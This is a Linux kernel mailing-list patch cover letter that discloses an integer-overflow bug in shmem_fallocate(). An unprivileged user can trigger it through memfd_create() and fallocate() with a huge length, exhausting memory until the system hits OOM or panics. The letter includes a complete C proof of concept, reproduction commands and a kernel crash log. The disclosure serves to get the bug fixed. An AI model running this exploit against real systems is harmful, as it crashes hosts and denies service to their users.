Return-Path: <owner-linux-mm@kvack.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from kanga.kvack.org (kanga.kvack.org [205.233.56.17])
	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 5B8C3C531D0
	for <linux-mm@archiver.kernel.org>; Mon, 27 Jul 2026 17:39:02 +0000 (UTC)
Received: by kanga.kvack.org (Postfix)
	id 39A396B007B; Mon, 27 Jul 2026 13:39:01 -0400 (EDT)
Received: by kanga.kvack.org (Postfix, from userid 40)
	id 34A716B008A; Mon, 27 Jul 2026 13:39:01 -0400 (EDT)
X-Delivered-To: int-list-linux-mm@kvack.org
Received: by kanga.kvack.org (Postfix, from userid 63042)
	id 212EA6B008C; Mon, 27 Jul 2026 13:39:01 -0400 (EDT)
X-Delivered-To: linux-mm@kvack.org
Received: from relay.hostedemail.com (smtprelay0016.hostedemail.com [216.40.44.16])
	by kanga.kvack.org (Postfix) with ESMTP id D6F6C6B007B
	for <linux-mm@kvack.org>; Mon, 27 Jul 2026 13:39:00 -0400 (EDT)
Received: from smtpin26.hostedemail.com (lb01a-stub [10.200.18.249])
	by unirelay09.hostedemail.com (Postfix) with ESMTP id 5500080141
	for <linux-mm@kvack.org>; Mon, 27 Jul 2026 17:39:00 +0000 (UTC)
X-FDA: 85035267240.26.4BE9569
Received: from mail-pl1-f182.google.com (mail-pl1-f182.google.com [209.85.214.182])
	by imf29.hostedemail.com (Postfix) with ESMTP id A5CB5120002
	for <linux-mm@kvack.org>; Mon, 27 Jul 2026 17:38:58 +0000 (UTC)
Authentication-Results: imf29.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20251104 header.b=GcnXYER0;
	spf=pass (imf29.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.214.182 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
	s=arc-20220608; t=1785173938;
	h=from:from:sender:reply-to:subject:subject:date:date:
	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
	 content-type:content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:references:dkim-signature;
	bh=DXKE3Oh2HM6+vKc9IdytYAftNN4xe0VXbR4kmTqxEGY=;
	b=NkhDQDMORK9JdO+DUuyxEKATZH8fUqa63fX8IwFuw8dtHHFc55x/oWvGkMqmThg3ISVtpl
	ZkKgPe53fW2IVug10TU1m5z9Z7ySDc7RMRMC6U1LpdhgNABIGvDU1U2e7OMf6aXRr97b9N
	Dbgq6lL5AlrfWQyDxdVdrHk4x8FgRNE=
ARC-Seal: i=1; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=none;
	t=1785173938;
	b=K0SlNW6AqQBnClybmRELzNcC/jxwsmG7xRa+gPbsPfGV5qAwPU9tufyGDMQnWwNAwZ+dxF
	M8C4TL0fLTUPBdPmINsmKZywAFGedWov8ptbQ9idOe5ZgcTPGCrcmqM/ME3ay/rnSQBlJ6
	uUvAf5PPFjCFAn9f0uqDF+Cq3E9og30=
ARC-Authentication-Results: i=1;
	imf29.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20251104 header.b=GcnXYER0;
	spf=pass (imf29.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.214.182 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com
Received: by mail-pl1-f182.google.com with SMTP id d9443c01a7336-2cca0c5799eso28297575ad.0
        for <linux-mm@kvack.org>; Mon, 27 Jul 2026 10:38:58 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785173937; x=1785778737; darn=kvack.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=DXKE3Oh2HM6+vKc9IdytYAftNN4xe0VXbR4kmTqxEGY=;
        b=GcnXYER0YRbieuGoVx8TIV2fAmn4fxQuE3cRSW3ySd0SsaXGhc/kmdfaPA7A+iP3EV
         ghSU0SE6WyIw/liEnJ4KHC1Z6wvKpqCW/LyrOQ4Dz4ure19n5XdFy9l7Nbz2aRZs+Emx
         /V36d8d795qgvQ7MMOvNiflFoZvTpDGES0T44d6IyZCClt+CwSvW1JT1cSnfqBu2o+pG
         GzlDUMBaL4tcwWDupY52YHlLwAR7vQhZA2z6NkyInkfhgVOeTfKVMmcoxaA3M9q6mVTW
         LXwwIR7AkBIl5w6SvIB84SFSvCrdJsDQhFL2jUooLdDPQgaDBPtt4LFRpfdjg+UbEgse
         B6qA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785173937; x=1785778737;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=DXKE3Oh2HM6+vKc9IdytYAftNN4xe0VXbR4kmTqxEGY=;
        b=iM9ZdoxaYWWNcPgT2BKG/9uUG/UoCiS0WNmsG3YUaMueN0LfiFYlpanWNfOVpJqsG9
         uRKO9ZJo4obEVh/g/5fz8azgXrEw4NUfoy4qlOTmdTvc7GRNSUH+r3FTKi0FBcnxyFfN
         3e6PUN/IKtU4D+0Rd6Ilb6+lfUhEmPen1ZsTxGQBlVZPWtdRoseBr2XVdAK4gFRb1n1u
         r/gaEmFnackjkjnTO2GSecLQYD2zbVSm6ANQevi631YUvNLdFxKEbVJ8Xr/N5CJ+a/Ye
         NFvvhsgjfdS6g4N3txDtZqzFNdwTbu+TFkaoICykYU5PS1joC2sJ/oV6U9NuPS7T5HC1
         wiuw==
X-Gm-Message-State: AOJu0YzAc8XLo6UInsabSgmdRPEflO7WzD1Rem/ZXf5OSPwYJHYfKoEJ
	V513FcWhv6CU99b1WG2vymMNYmxOWqLXVFbq9kW+fDAgA2zBKM/hHEkZzK495VPqou0=
X-Gm-Gg: AR+sD12BwQU+DZFo3bldvVILcy+JDiVv3m8TDmtXMX42rgfAT58QqMKXdN9RRVkLOPh
	6+HFN5KA6Q8/MTA0CM0EDGwShoszOgCTaDQVXBmBBRdgxlTyfCGi4tIxqAjXeN/otmdZyJvuhMz
	KJj2l7eCNHkyudtR8NVE7MRzgJ6LOXSRb5YU0GgL47o5JJKMGIkDfQa5xbYwDmTjuhyVWRTKANS
	tmHUOuU75AzeDOnTQKkM5uJiqwsOEVzXwWXhk5x8myj5CQO48o8Sa8RmLaTMIAnMwJdfahyQ8nq
	0pDwl8xHTvkUY9zY78ZdfEAIWTp3UiCMmoQVQZZCKtXe//KpsgaE3Ml5GdMhWsEAOFtqgjkmrUV
	PHjzSn8EcXDSTNUqsFly+z7uXZy0K+EeAcSh8lrg6epINEIq0/a8B0Wa5hYRO48SkzLo86KqJV+
	9U+W2PM5eY9/t2JcORB5Zw
X-Received: by 2002:a17:902:ea02:b0:2bf:7b62:a038 with SMTP id d9443c01a7336-2cfde687e7bmr95043155ad.9.1785173937197;
        Mon, 27 Jul 2026 10:38:57 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2cfde59bb13sm39402515ad.1.2026.07.27.10.38.53
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 27 Jul 2026 10:38:56 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: linux-mm@kvack.org
Cc: hughd@google.com,
	baolin.wang@linux.alibaba.com,
	akpm@linux-foundation.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH 0/1] mm: shmem: reject impossible fallocate ranges
Date: Tue, 28 Jul 2026 01:38:50 +0800
Message-ID: <cover.1784947149.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.51.0
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Rspamd-Server: rspam10
X-Rspamd-Queue-Id: A5CB5120002
X-Stat-Signature: 1hucufco9coem8qcur8mmu9umy6wz7sz
X-Rspam-User: 
X-HE-Tag: 1785173938-503928
X-HE-Meta: U2FsdGVkX18cnRcKe0MCIF33pyi0p+61thdN03IRdG0p+j1y3eXvmWbJPq3R2Aa1l6EL2hFhEbbNQXVDrIxwU2b1k2W9zrQNB1bg9lzlQhVV9Z/5rZu2GLOO0+clsiP3jJkbO4nkjDvUeGVv4q8T3tYaFrC/Tq8IJ6aYNGidJH/WWgQs/5Q1mNY4kel1l386h8Du7UHGPoI/w4ZWrZ8eA/fr9YT9fGb4o26aRHqxIZNu81exo8xK+5W5GrC4xhmVGwkrswzBgScUKJr80LrHIfO1/rwhsjp7xUUGOh1BrYB0S3PIStqt3++fOJr0lMoGqDHWhBch0Qe84MN/Bv+F4HRdkXvdLXrDwzFaHAE2bu/pTnARB4I9x9WuS0cm1HpSOtNXZJPA80TktpJ33gM2e1TdavRRtl9wSn159fOptv7eck8/+zBzdBkhRLRDGXHS3pi7BF+CRBlhqpLoGOIpJZ/77LYcXRBTK6rz6250xw8C0EALudKTTBBpFXM0YieNYA2ak7XWBwhYGNY7MAnUPsNL/9nWYzWXPlPP/gkiNdNs8e//01Anc6G2m2ad+24pc6QvXyRhRDNWL1WPMFiJGYZoNpz/3aRQYgn6F5W3dML0xVby0bS4mHi7V/xF0vjd2gTnVobSDd9CKNTdS0/iUzURLTLQeIWnZEBk+ARGfR+qI37WO/AfguRuwDOBvtFHNCZITH9PeoKQjXKp7qi1WS++rpesLKGSxMqsHP4Fh5uE/sBVAYaY1NgaaYl+JwpsbcRCptSqHM+VgPXRmNxeMjlMGeYN9JWcVMRdh2FfjMNKp9/0JqXGRHsvmOp6miBx7pk2K6N6Fkfoxvj9Nvu1sUnb1NiHb5bnEdjmIgn442Jsk00pjLzVBAkTd9Umh+chxmR5qDKB8js5YDgwfEocNcarAxGlZH99g8Z7qrUs5YjL7wEXNJMn7lNEJuYYUm4btH7CD8/bT7XFJYdl8Ro
 36MLNs5D
 b38hX76XooZr4Oe5Xfi/9+Ucpn5FaAo2zbANgcxUCQdE57HJ0Iae+So0ozPhZXchD9R4GlbdPtB2M1/vqKh1hbKn4y/H4RmoT/a90pvCFladdM41e5Up2OeAAHI72BN7+KEM1fwDd9I1ZcTrUfL1w1hzc3T13iCiW2w5RPw21HnMC6LpXww4gO92XFeMZ2dZg8dU9mvKAaiL6baTLW4WV7sQ1xj8j3UKWaQLok70GiwUS3dd6gB8E6HZUAN8xWzDBxAfP8u70AhcqtyWMum0xne9mt2E6brFHgpZ8Qa2lcoHzpm67bSatd3Jt8ZTJTchj+mbSzHdjqLQ5ZtCa3Grt+N4R/Dst6B/ySMbT
Sender: owner-linux-mm@kvack.org
Precedence: bulk
X-Loop: owner-majordomo@kvack.org
List-ID: <linux-mm.kvack.org>
List-Subscribe: <mailto:majordomo@kvack.org>
List-Unsubscribe: <mailto:majordomo@kvack.org>

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in mm/shmem.c. The bug is reachable by
an unprivileged local user without extra namespaces or capabilities.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

shmem_fallocate() validates offset + len with inode_newsize_ok(), but
the preallocation path then rounds the end offset up to a page boundary
with offset + len + PAGE_SIZE - 1. For requests ending at
MAX_LFS_FILESIZE, such as a memfd fallocate() with len == LLONG_MAX,
offset + len is valid but the extra PAGE_SIZE - 1 addition can overflow
loff_t before the value is shifted into a pgoff_t.

Avoiding the signed overflow alone is not enough. If the rounded end is
computed from the validated end position, the same memfd request still
covers about 8 EiB worth of pages. On the internal tmpfs mount used by
memfd_create(), sbinfo->max_blocks is zero, so the existing tmpfs size
guard is skipped. shmem_fallocate() can then enter the folio allocation
loop over an impossible range and consume memory until OOM.

The fix caches the already validated end position and casts it to u64
before rounding up to a page index. It then computes the requested page
count and rejects ranges that exceed the tmpfs instance limit, exceed
LONG_MAX, or exceed available RAM plus swap. These checks run before the
allocation loop, while the existing size and seal checks continue to use
the same validated end position.

Reproducer:

    ./poc observe 5

Crash collection used:

    echo 1 > /proc/sys/vm/panic_on_oom
    echo 0 > /proc/sys/kernel/panic_on_warn
    echo 8 4 1 7 > /proc/sys/kernel/printk
    su -s /bin/sh -c './poc crash' test_user

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE
#include <errno.h>
#include <limits.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <linux/memfd.h>

static int xmemfd_create(const char *name, unsigned int flags)
{
	return syscall(SYS_memfd_create, name, flags);
}

static int xfallocate(int fd, int mode, off_t offset, off_t len)
{
	return syscall(SYS_fallocate, fd, mode, offset, len);
}

static unsigned long read_mem_available_kb(void)
{
	FILE *fp;
	char key[64];
	unsigned long value;
	char unit[32];

	fp = fopen("/proc/meminfo", "r");
	if (!fp) {
		perror("fopen(/proc/meminfo)");
		return 0;
	}

	while (fscanf(fp, "%63s %lu %31s\n", key, &value, unit) == 3) {
		if (!strcmp(key, "MemAvailable:")) {
			fclose(fp);
			return value;
		}
	}

	fclose(fp);
	fprintf(stderr, "MemAvailable not found in /proc/meminfo\n");
	return 0;
}

static int trigger_bug(void)
{
	int fd;
	off_t len = LLONG_MAX;

	fd = xmemfd_create("shmem-fallocate-overflow", MFD_CLOEXEC);
	if (fd < 0) {
		perror("memfd_create");
		return 1;
	}

	fprintf(stderr, "triggering fallocate(len=%lld)\n", (long long)len);
	if (xfallocate(fd, 0, 0, len) < 0) {
		perror("fallocate");
		close(fd);
		return 1;
	}

	close(fd);
	return 0;
}

static int observe_bug(int seconds)
{
	pid_t pid;
	unsigned long start_kb;
	unsigned long end_kb;
	int status;
	int i;

	start_kb = read_mem_available_kb();
	fprintf(stderr, "MemAvailable before: %lu kB\n", start_kb);

	pid = fork();
	if (pid < 0) {
		perror("fork");
		return 1;
	}

	if (pid == 0)
		_exit(trigger_bug());

	for (i = 0; i < seconds; i++) {
		sleep(1);
		end_kb = read_mem_available_kb();
		fprintf(stderr, "t=%d MemAvailable=%lu kB delta=%ld kB\n",
			i + 1, end_kb, (long)end_kb - (long)start_kb);
	}

	if (kill(pid, SIGKILL) < 0 && errno != ESRCH)
		perror("kill");

	if (waitpid(pid, &status, 0) < 0) {
		perror("waitpid");
		return 1;
	}

	if (WIFSIGNALED(status))
		fprintf(stderr, "child killed by signal %d\n", WTERMSIG(status));
	else if (WIFEXITED(status))
		fprintf(stderr, "child exited with status %d\n", WEXITSTATUS(status));

	return 0;
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage:\n"
		"  %s crash\n"
		"  %s observe [seconds]\n",
		prog, prog);
}

int main(int argc, char **argv)
{
	if (argc < 2) {
		usage(argv[0]);
		return 1;
	}

	if (!strcmp(argv[1], "crash"))
		return trigger_bug();

	if (!strcmp(argv[1], "observe")) {
		int seconds = 5;

		if (argc >= 3)
			seconds = atoi(argv[2]);
		if (seconds <= 0)
			seconds = 5;
		return observe_bug(seconds);
	}

	usage(argv[0]);
	return 1;
}

------END poc.c--------

----BEGIN crash log----

[  306.697793][ T9406] poc invoked oom-killer: gfp_mask=0x140cca(GFP_HIGHUSER_MOVABLE|__GFP_COMP), order=0, oom_score_adj=0
[  306.700658][ T9406] CPU: 0 UID: 1001 PID: 9406 Comm: poc Not tainted 7.1.0-rc2-g6f381f63ccfe-dirty #3 PREEMPT(full)
[  306.700672][ T9406] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  306.700680][ T9406] Call Trace:
[  306.700683][ T9406]  <TASK>
[  306.700687][ T9406]  dump_stack_lvl (build/../lib/dump_stack.c:94 build/../lib/dump_stack.c:120)
[  306.700772][ T9406]  dump_header (build/../mm/oom_kill.c:464)
[  306.700785][ T9406]  out_of_memory (build/../mm/oom_kill.c:1075 build/../mm/oom_kill.c:1143)
[  306.700793][ T9406]  ? __pfx_out_of_memory (build/../mm/oom_kill.c:835)
[  306.700803][ T9406]  __alloc_frozen_pages_noprof (build/../mm/page_alloc.c:4116 build/../mm/page_alloc.c:4914 build/../mm/page_alloc.c:5239)
[  306.700818][ T9406]  ? __pfx___alloc_frozen_pages_noprof (build/../mm/page_alloc.c:3993 (discriminator 1))
[  306.700827][ T9406]  ? do_raw_spin_lock (build/../include/linux/instrumented.h:55 build/../include/linux/atomic/atomic-instrumented.h:1301 build/../include/asm-generic/qspinlock.h:111 build/../kernel/locking/spinlock_debug.c:116)
[  306.700883][ T9406]  ? __pfx_do_raw_spin_lock (build/../kernel/locking/spinlock_debug.c:64 (discriminator 8))
[  306.700889][ T9406]  ? find_held_lock (build/../kernel/locking/lockdep.c:5350)
[  306.700896][ T9406]  ? __sanitizer_cov_trace_switch (build/../kernel/kcov.c:351 (discriminator 1))
[  306.700903][ T9406]  ? policy_nodemask (build/../mm/mempolicy.c:2310 (discriminator 1))
[  306.700911][ T9406]  alloc_pages_mpol (build/../mm/mempolicy.c:2490)
[  306.700918][ T9406]  ? __pfx_alloc_pages_mpol (build/../mm/mempolicy.c:2281)
[  306.700923][ T9406]  ? find_held_lock (build/../kernel/locking/lockdep.c:5350)
[  306.700929][ T9406]  folio_alloc_mpol_noprof (build/../mm/mempolicy.c:2509)
[  306.700935][ T9406]  shmem_alloc_folio (build/../mm/shmem.c:1933 (discriminator 1))
[  306.700943][ T9406]  shmem_alloc_and_add_folio (build/../mm/shmem.c:1975)
[  306.700951][ T9406]  ? __pfx_shmem_alloc_and_add_folio (build/../mm/shmem.c:1531 (discriminator 1))
[  306.700957][ T9406]  ? shmem_allowable_huge_orders (build/../mm/shmem.c:1846)
[  306.700963][ T9406]  shmem_get_folio_gfp (build/../mm/shmem.c:2564)
[  306.700970][ T9406]  ? __pfx_shmem_get_folio_gfp (build/../include/linux/huge_mm.h:352)
[  306.700976][ T9406]  ? __pfx___might_resched (build/../kernel/sched/core.c:5888 (discriminator 7))
[  306.700983][ T9406]  shmem_fallocate (build/../mm/shmem.c:2670 (discriminator 1) build/../mm/shmem.c:3766 (discriminator 1))
[  306.700991][ T9406]  ? __pfx_shmem_fallocate (build/../include/linux/quotaops.h:26)
[  306.700996][ T9406]  ? register_lock_class (build/../kernel/locking/lockdep.c:1294)
[  306.701003][ T9406]  ? __lock_acquire (build/../kernel/locking/lockdep.c:4674 build/../kernel/locking/lockdep.c:5191)
[  306.701009][ T9406]  ? __pfx___file_has_perm (build/../security/selinux/include/objsec.h:186)
[  306.701043][ T9406]  ? vfs_write (build/../fs/read_write.c:680)
[  306.701049][ T9406]  ? __pfx_anon_pipe_write (build/../fs/pipe.c:145)
[  306.701057][ T9406]  ? __pfx___might_resched (build/../kernel/sched/core.c:5888 (discriminator 7))
[  306.701062][ T9406]  ? __pfx_shmem_fallocate (build/../include/linux/quotaops.h:26)
[  306.701067][ T9406]  vfs_fallocate (build/../fs/open.c:338)
[  306.701073][ T9406]  ? __pfx_vfs_fallocate (build/../fs/open.c:437)
[  306.701078][ T9406]  ? ksys_write (build/../fs/read_write.c:745)
[  306.701082][ T9406]  ? __pfx_ksys_write (build/../fs/read_write.c:724)
[  306.701088][ T9406]  __x64_sys_fallocate (build/../fs/open.c:362 build/../fs/open.c:367 build/../fs/open.c:365 build/../fs/open.c:365)
[  306.701094][ T9406]  do_syscall_64 (build/../arch/x86/entry/syscall_64.c:63 build/../arch/x86/entry/syscall_64.c:94)
[  306.701100][ T9406]  ? clear_bhb_loop (build/../arch/x86/entry/entry_64.S:1547)
[  306.701107][ T9406]  entry_SYSCALL_64_after_hwframe (build/../arch/x86/entry/entry_64.S:121)
[  306.701112][ T9406] RIP: 0033:0x7f7a21617fc9
[  306.701125][ T9406] Code: Unable to access opcode bytes at 0x7f7a21617f9f.

Code starting with the faulting instruction
===========================================
[  306.701142][ T9406] RSP: 002b:00007fff3e158718 EFLAGS: 00000246 ORIG_RAX: 000000000000011d
[  306.701148][ T9406] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 00007f7a21617fc9
[  306.701151][ T9406] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000003
[  306.701153][ T9406] RBP: 0000558780fbe5e0 R08: 00007fff3e156485 R09: 0000000000000000
[  306.701158][ T9406] R10: 7fffffffffffffff R11: 0000000000000246 R12: 0000558780fbe360
[  306.701161][ T9406] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[  306.701167][ T9406]  </TASK>
[  306.701170][ T9406] Mem-Info:
[  306.735371][ T9406] active_anon:19106 inactive_anon:169883 isolated_anon:0
[  306.735371][ T9406]  active_file:0 inactive_file:24 isolated_file:0
[  306.735371][ T9406]  unevictable:1768 dirty:0 writeback:0
[  306.735371][ T9406]  slab_reclaimable:12168 slab_unreclaimable:52982
[  306.735371][ T9406]  mapped:13 shmem:182218 pagetables:572
[  306.735371][ T9406]  sec_pagetables:0 bounce:0
[  306.735371][ T9406]  kernel_misc_reclaimable:0
[  306.735371][ T9406]  free:14712 free_pcp:0 free_cma:0
[  306.740037][ T9406] Node 0 active_anon:76424kB inactive_anon:679532kB active_file:0kB inactive_file:96kB unevictable:7072kB isolated(anon):0kB isolated(file):0kB mapped:52kB dirty:0kB writeback:0kB shmem:728872kB shmem_thp:0kB shmem_pmdmapped:0kB anon_thp:0kB kernel_stack:9216kB pagetables:2288kB sec_pagetables:0kB all_unreclaimable? yes Balloon:0kB gpu_active:0kB gpu_reclaim:0kB
[  306.743505][ T9406] Node 0 DMA free:5596kB boost:0kB min:532kB low:664kB high:796kB reserved_highatomic:0KB free_highatomic:0KB active_anon:0kB inactive_anon:9732kB active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB zspages:0kB present:15992kB managed:15360kB mlocked:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB
[  306.746556][ T9406] lowmem_reserve[]: 0 1275 1275 1275 1275
[  306.747274][ T9406] Node 0 DMA32 free:53252kB boost:12288kB min:56808kB low:67936kB high:79064kB reserved_highatomic:0KB free_highatomic:0KB active_anon:40860kB inactive_anon:705364kB active_file:48kB inactive_file:96kB unevictable:7072kB writepending:0kB zspages:0kB present:2080640kB managed:1305728kB mlocked:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB
[  306.750600][ T9406] lowmem_reserve[]: 0 0 0 0 0
[  306.751340][ T9406] Node 0 DMA: 1*4kB (M) 1*8kB (M) 1*16kB (M) 2*32kB (ME) 2*64kB (ME) 2*128kB (ME) 2*256kB (ME) 1*512kB (E) 2*1024kB (UE) 1*2048kB (E) 0*4096kB = 5596kB
[  306.752999][ T9406] Node 0 DMA32: 5*4kB (UM) 829*8kB (U) 595*16kB (U) 861*32kB (U) 130*64kB (UE) 8*128kB (UE) 1*256kB (E) 0*512kB 0*1024kB 0*2048kB 0*4096kB = 53324kB
[  306.754618][ T9406] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=1048576kB
[  306.755718][ T9406] Node 0 hugepages_total=4 hugepages_free=4 hugepages_surp=0 hugepages_size=2048kB
[  306.756757][ T9406] 182245 total pagecache pages
[  306.757351][ T9406] 0 pages in swap cache
[  306.757827][ T9406] Free swap  = 0kB
[  306.758250][ T9406] Total swap = 0kB
[  306.758656][ T9406] 524158 pages RAM
[  306.759056][ T9406] 0 pages HighMem/MovableOnly
[  306.759579][ T9406] 193886 pages reserved
[  306.760007][ T9406] 0 pages cma reserved
[  306.760427][ T9406] Memory cgroup min protection 0kB -- low protection 0kB
[  306.760432][ T9406] Tasks state (memory values in pages):
[  306.761777][ T9406] [  pid  ]   uid  tgid total_vm      rss rss_anon rss_file rss_shmem pgtables_bytes swapents oom_score_adj name
[  306.763070][ T9406] [   4984]     0  4984     7999      232      229        2         1    86016        0          -250 systemd-journal
[  306.765067][ T9406] [   4996]     0  4996     9308     2932     2930        2         0   102400        0         -1000 systemd-udevd
[  306.766519][ T9406] [   8730]     0  8730     1411       71       69        2         0    53248        0             0 cron
[  306.767789][ T9406] [   8769]     0  8769    55235      396      394        2         0    86016        0             0 rsyslogd
[  306.769071][ T9406] [   9092]     0  9092    24967      352      350        2         0    69632        0             0 dhclient
[  306.770311][ T9406] [   9125]     0  9125      720       34       32        2         0    45056        0             0 agetty
[  306.771549][ T9406] [   9126]     0  9126      720       34       32        2         0    45056        0             0 agetty
[  306.772778][ T9406] [   9127]     0  9127      720       34       32        2         0    49152        0             0 agetty
[  306.774117][ T9406] [   9128]     0  9128      720       35       33        2         0    45056        0             0 agetty
[  306.775376][ T9406] [   9129]     0  9129      720       34       32        2         0    45056        0             0 agetty
[  306.776577][ T9406] [   9130]     0  9130      720       34       32        2         0    45056        0             0 agetty
[  306.777819][ T9406] [   9131]     0  9131     1101       36       34        2         0    49152        0             0 agetty
[  306.779045][ T9406] [   9132]     0  9132     3336      244      242        2         0    57344        0         -1000 sshd
[  306.780222][ T9406] [   9134]     0  9134    14097      391      390        1         0    94208        0             0 nginx
[  306.781461][ T9406] [   9135]    33  9135    14190      472      470        2         0    98304        0             0 nginx
[  306.782733][ T9406] [   9136]    33  9136    14190      472      470        2         0    98304        0             0 nginx
[  306.783908][ T9406] [   9398]     0  9398     3451      290      288        2         0    69632        0             0 sshd
[  306.785108][ T9406] [   9404]     0  9404     2061      141      139        2         0    53248        0             0 su
[  306.786360][ T9406] [   9405]  1001  9405      622       22       21        1         0    49152        0             0 sh
[  306.787594][ T9406] [   9406]  1001  9406      560       21       20        1         0    40960        0             0 poc
[  306.788917][ T9406] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
[  306.789879][ T9406] CPU: 0 UID: 1001 PID: 9406 Comm: poc Not tainted 7.1.0-rc2-g6f381f63ccfe-dirty #3 PREEMPT(full)
[  306.791021][ T9406] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  306.792345][ T9406] Call Trace:
[  306.792731][ T9406]  <TASK>
[  306.793049][ T9406]  dump_stack_lvl (build/../lib/dump_stack.c:94 build/../lib/dump_stack.c:120)
[  306.793544][ T9406]  vpanic (build/../kernel/panic.c:650)
[  306.794022][ T9406]  ? __pfx_vpanic (build/../kernel/panic.c:361)
[  306.794532][ T9406]  ? dump_task.part.0 (build/../include/linux/spinlock.h:390 build/../include/linux/sched/task.h:225 build/../mm/oom_kill.c:407)
[  306.795113][ T9406]  panic (build/../kernel/panic.c:787)
[  306.795510][ T9406]  ? __pfx_panic (build/../kernel/panic.c:740)
[  306.795976][ T9406]  ? dump_header (build/../include/linux/rcupdate.h:310 (discriminator 1) build/../include/linux/rcupdate.h:869 (discriminator 1) build/../mm/oom_kill.c:440 (discriminator 1) build/../mm/oom_kill.c:474 (discriminator 1))
[  306.796473][ T9406]  ? dump_header (build/../include/linux/rcupdate.h:871 build/../mm/oom_kill.c:440 build/../mm/oom_kill.c:474)
[  306.796971][ T9406]  ? out_of_memory (build/../mm/oom_kill.c:1076 build/../mm/oom_kill.c:1143)
[  306.797527][ T9406]  out_of_memory (build/../mm/oom_kill.c:1076 (discriminator 4) build/../mm/oom_kill.c:1143 (discriminator 4))
[  306.798042][ T9406]  ? __pfx_out_of_memory (build/../mm/oom_kill.c:835)
[  306.798600][ T9406]  __alloc_frozen_pages_noprof (build/../mm/page_alloc.c:4116 build/../mm/page_alloc.c:4914 build/../mm/page_alloc.c:5239)
[  306.799291][ T9406]  ? __pfx___alloc_frozen_pages_noprof (build/../mm/page_alloc.c:3993 (discriminator 1))
[  306.799976][ T9406]  ? do_raw_spin_lock (build/../include/linux/instrumented.h:55 build/../include/linux/atomic/atomic-instrumented.h:1301 build/../include/asm-generic/qspinlock.h:111 build/../kernel/locking/spinlock_debug.c:116)
[  306.800499][ T9406]  ? __pfx_do_raw_spin_lock (build/../kernel/locking/spinlock_debug.c:64 (discriminator 8))
[  306.801083][ T9406]  ? find_held_lock (build/../kernel/locking/lockdep.c:5350)
[  306.801599][ T9406]  ? __sanitizer_cov_trace_switch (build/../kernel/kcov.c:351 (discriminator 1))
[  306.802208][ T9406]  ? policy_nodemask (build/../mm/mempolicy.c:2310 (discriminator 1))
[  306.802728][ T9406]  alloc_pages_mpol (build/../mm/mempolicy.c:2490)
[  306.803241][ T9406]  ? __pfx_alloc_pages_mpol (build/../mm/mempolicy.c:2281)
[  306.803803][ T9406]  ? find_held_lock (build/../kernel/locking/lockdep.c:5350)
[  306.804289][ T9406]  folio_alloc_mpol_noprof (build/../mm/mempolicy.c:2509)
[  306.804866][ T9406]  shmem_alloc_folio (build/../mm/shmem.c:1933 (discriminator 1))
[  306.805531][ T9406]  shmem_alloc_and_add_folio (build/../mm/shmem.c:1975)
[  306.806800][ T9406]  ? __pfx_shmem_alloc_and_add_folio (build/../mm/shmem.c:1531 (discriminator 1))
[  306.807460][ T9406]  ? shmem_allowable_huge_orders (build/../mm/shmem.c:1846)
[  306.808122][ T9406]  shmem_get_folio_gfp (build/../mm/shmem.c:2564)
[  306.808675][ T9406]  ? __pfx_shmem_get_folio_gfp (build/../include/linux/huge_mm.h:352)
